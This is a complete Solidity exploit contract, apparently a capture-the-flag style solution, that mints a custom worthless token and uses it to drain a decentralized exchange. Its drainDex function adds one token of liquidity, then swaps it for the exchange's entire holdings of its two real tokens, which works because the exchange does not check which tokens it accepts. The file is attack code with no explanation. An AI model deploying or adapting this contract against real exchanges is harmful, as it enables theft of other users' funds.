// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;


import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.4.2/contracts/token/ERC20/ERC20.sol";


interface IDex {
  function token1() external view returns(address);
  function token2() external view returns(address);
  function swap(address from, address to, uint amount) external;
  function add_liquidity(address token_address, uint amount) external;
}

contract SwappableTokenThree is ERC20 {
  IDex dexContract;

  constructor(address _dexContract) public ERC20("Token 3", "TK3") {
    uint initalSupply = 4;
    dexContract = IDex(_dexContract);

    _mint(address(this), initalSupply);
    _approve(address(this), _dexContract, initalSupply); // allow Dex to spend whole supply
  }

  function drainDex() external {
    dexContract.add_liquidity(address(this), 1);
    dexContract.swap(address(this), dexContract.token1(), 1); // swap 1 of 'Token 3' for all of 'Token 1'

    dexContract.swap(address(this), dexContract.token2(), 2); // swap 2 of 'Token 3' for all of 'Token 2'
  }
}
